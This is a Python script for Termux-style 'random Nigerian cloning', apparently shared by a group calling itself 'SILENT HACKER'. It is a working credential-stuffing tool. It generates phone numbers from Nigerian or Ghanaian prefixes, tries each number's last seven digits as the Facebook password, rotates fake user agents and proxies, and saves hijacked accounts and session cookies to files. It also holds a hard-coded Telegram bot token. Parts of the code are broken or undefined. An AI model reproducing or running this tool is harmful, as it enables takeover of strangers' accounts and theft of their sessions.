#- SCRIPT UTA LE 
#- AUR FOLLOW KARNA NA BHOOLNA

from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python SILENT.py')
from bs4 import BeautifulSoup
##-----------[ USER-AGENT ]--------------##
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mKALL XD - RegiGiya')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 6.0.1; vivo Y53 Build/MMB29M; wv)'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d ='Chrome'
	e=random.randrange(100, 9999)
	f=' AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ '
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 VivoBrowser/8.6.12.9'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j}.{k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; Android 7.1.2;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' vivo X9Plus L)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
for x in range(10):
	a='Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='Linux; Android 8.1.0; vivo 1724'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile Safari/537.36'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
##------------[ INDICATION ]---------------##
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
##------------[ WARNA-COLOR ]--------------##
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#WARNA RICH RICH #
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
O2 = "[#00FFFF]" # Biru muda
P2 = "[#FFFFFF]" # Putih
B2 = "[#00C8FF]" # Biru
kall = random.choice([H2,K2,O2,B2])
kall2 = random.choice(["purple","green","yellow","blue"])
##------------[ CONVERTER-BULAN ]-----------##
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def waktu():
	now = datetime.datetime.now()
	hours = now.hour
	if 4 <= hours < 11:timenow = "Selamat pagi "
	elif 11 <= hours < 15:timenow = "Selamat siang "
	elif 15 <= hours < 18:timenow = "Selamat sore "
	else:timenow = "Selamat malam"
	return timenow
kall_x = random.choice(['HALLO','HAI KAK','HALLO KAK','HAI OM','HALLO OM','HAI TER','HALLO TER '])
IP = requests.get("http://ip-api.com/json/").json()["query"]
negara = requests.get("http://ip-api.com/json/").json()["country"]
datt = []
sim = requests.get("http://ip-api.com/json/").json()["isp"]
ID="5384702841";
tok="5776502345:AAHjSq-YPr7FpJ2rnYrm71D1KgQ6HoRJ-78"
#------------------[ MACHINE-SUPPORT ]---------------#
def jalan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
	
logo = """
\t\x1b[1;92m##     ##    ###    ########  ##    ## 
\t\x1b[1;97m###   ###   ## ##   ##     ## ##   ##  
\t\x1b[1;92m#### ####  ##   ##  ##     ## ##  ##   
\t\x1b[1;97m## ### ## ##     ## ########  #####    
\t\x1b[1;92m##     ## ######### ##   ##   ##  ##   
\t\x1b[1;97m##     ## ##     ## ##    ##  ##   ##  
\t\x1b[1;92m##     ## ##     ## ##     ## ##    ## 
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m AUTHOR  \x1b[1;97m :  \033[1;32m   SILENT HACKER 
\033[1;31m\033[1;37m FACEBOOK \x1b[1;97m:  \033[1;32m   SILENT CORNEL
\033[1;31m\033[1;37m GROUP   \x1b[1;97m :  \033[1;32m   RELATIONSHIP GOALS 
\033[1;31m\033[1;37m VERSION \x1b[1;97m :  \033[1;32m   6.0.0\x1b[1;94m + Updated
\033[1;37m------------------------\033[1;37m------------------------ """
os.system('clear')
def chk():
  uuid = str(os.geteuid()) + str(os.getlogin()) 
  id = "|".join(uuid)
  print("\n\n\x1b[37;1m  YOUR ID : \033[94m"+id) 
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/Silenthacker804/SILENT/main/approve.py").text 
    if id in httpCaht: 
      print("\033[92m  YOUR ID IS ACTIVE. .......\033[97m") 
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else: 
      print("\033[0;93m YOUR ID IS NOT ACTIVE COPY AND SEND ME MESSAGE ON WHATSAPP !!!") 
      os.system('xdg-open  https://wa.me/2348167676589?text=*Hello*')
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print (logo)
     chk() 
    
chk()
os.system('clear')
os.system('clear')
def chk():
  uuid = str(os.geteuid()) + str(os.getlogin()) 
  id = "|".join(uuid)
  print("\n\n\x1b[37;1m  YOUR ID : \033[94m"+id) 
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/Silenthacker804/SILENT/main/approve.py").text 
    if id in httpCaht: 
      print("\033[92m  YOUR ID IS ACTIVE. .......\033[97m") 
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else: 
      print("\033[0;93m YOUR ID IS NOT ACTIVE COPY AND SEND ME MESSAGE ON WHATSAPP !!!") 
      os.system('xdg-open  https://wa.me/2348167676589?text=*Hello*')
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print (logo)
     chk() 
    
chk()
os.system('clear')

def linex():
    print(f'{GREEN}==================================================')
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mMARK-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mMARK-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mMARK-2F.txt' %
              (H, P, str(len(twf))))
        input("\x1b[1;97mPRESE ENTER TO BACK xyz  ")
        xyz()
loop = 0
cps = []
oks = []
twf = []
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS ðŸŽ®%s  '%(ORANGE))
    else:
        print(f'\r {GREEN}[âˆš] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS ðŸŽ®%s'%(ORANGE))
    else:
        print(f'\r ðŸŽ®  %{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
            print(f"{GREEN}[âˆš]------------------------------------------[âˆš]")
    #____________#
def xyz():
    os.system("play-audio dapet.mp3")
    os.getuid
    os.system("clear");print(logo)
    print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
    print(f"")
    print(f"{BLUE}[01] {GREEN}RANDOM NIGERIAN CLONING")
    print(f"{BLUE}[00] {GREEN}EXIT PROGRAM ")
    print(f"")
    print(f"\033[1;91m==================================================")
    LUQMAN = input("[âˆš] CHOOSE : ")
    if LUQMAN in ["1","01"]:
        Tabii()
    elif LUQMAN in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\033[1;31m')
        xyz()

#_____________#
 
#_____________________#

def Tabii():
    user=[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mNIGERA ENTER ANY CODES EXAMPLE :ðŸ‘‡\033[0;m]")
    print(f"")
    print('\033[0;97mEnter any Code >> \033[0;96m234704 ,234903 ,234701 ,234808')
    print(f"\033[0;97mEnter any Code >> \033[0;96m234816 ,234916 ,234806 ,234702")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mGHANA ENTER ANY CODES EXAMPLE :ðŸ‘‡\033[0;m]")
    print(f"")
    print(f"\033[0;97mEnter any Code >> \033[0;96m233573, 233269, 233243, 233245")
    print(f"\033[0;97mEnter any Code >> \033[0;96m233207 ,233559 ,233556 ,233249")
    print(f"")
    linex()
    code = input(' INPUT CODE :\033[0;97m ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' \033[0;97mEXAMPLE:\033[0;96m 1000, 2000, 5000, 10000\n\n \033[0;97mPUT CLONING LIMIT: \033[0;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
        print(f" {BLUE}TOTAL IDZ             : {GREEN}"+tl)
        print(f" {BLUE}COUNTRY YOU CHOOSE    : {GREEN}NIGERIA ")
        print(f" {BLUE}NUMBER YOU PUT        : {GREEN}"+code)
        print(f" {BLUE}PROCESS HAS BEEN STARTED")
        print(f'{GREEN}================================================')
        for love in user:
            uid = code+love
            pwx = [love,]
            yaari.submit(free,uid,pwx,tl)
def free(uid,pwx,tl):
    global loop
    global oks
    global ugen
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'m.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':pro}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                os.system("play-audio dapet.mp3")
                print('     \033[1;32m[SILENT-OK] '+uid+' | '+ps+
'\n\033[1;37mCookies :\033[1;34m'+coki+'\033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/SILENT-OK.txt', 'a').write(uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[24:39]
                Red = '\033[1;31m'
                print('     \033[1;33m[SILENT-CP] '+uid+' | '+ps+'\033[0;97m')
                open('/sdcard/SILENT-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            elif '/x/checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[7:22]
                Red = '\033[1;31m'
                print('     \033[1;33m[TEMP-LOCK] '+uid+' | '+ps+'\033[1;97m')
                open('/sdcard/SILENT-2F.txt', 'a').write(uid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ SILENT ] [%s] \33[1;97m[OK:- %s CP:- %s]\r'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        passg

        
 
if __name__ == '__main__':
    xyz()